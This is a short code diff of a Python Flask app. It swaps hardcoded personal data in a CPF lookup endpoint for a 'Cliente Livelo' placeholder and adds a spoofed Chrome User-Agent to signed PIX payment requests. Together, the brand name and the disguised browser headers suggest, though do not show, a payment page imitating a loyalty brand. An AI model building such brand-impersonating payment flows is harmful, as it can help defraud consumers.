@@ -510,9 +510,9 @@ def api_cpf():
     return jsonify({
         "ok": True,
         "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
-        "nome": "João Silva",
-        "nome_mae": "Maria Silva",
-        "data_nasc": "10/05/1990"
+        "nome": "Cliente Livelo",
+        "nome_mae": "",
+        "data_nasc": "01/01/1990"
     })
 
 
@@ -652,6 +652,7 @@ def c7_create_pix(amount: float, payer_name: str, payer_cpf: str, payment_id: st
             headers = {
                 "Authorization": f"Bearer {api_key}",
                 "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                 "X-C7-Timestamp": ts,
                 "X-C7-Nonce": nonce,
                 "X-C7-Signature": sig
